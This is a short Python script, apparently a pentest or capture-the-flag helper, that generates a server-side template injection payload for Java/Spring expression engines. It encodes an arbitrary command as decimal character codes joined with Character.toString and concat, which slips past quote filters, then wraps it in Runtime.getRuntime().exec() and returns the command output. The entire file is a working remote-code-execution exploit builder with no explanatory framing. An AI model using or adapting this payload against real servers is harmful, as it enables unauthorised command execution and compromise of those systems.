payload = ''
num = input('Enter a string of decimals separated by spaces: ')
num = num.split()
payload += '(*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(' + num[0] + ')'
num = num[1:]
for x in num:
    payload += '.concat(T(java.lang.Character).toString(' + x + '))'

payload += ').getInputStream())})'
print(payload)

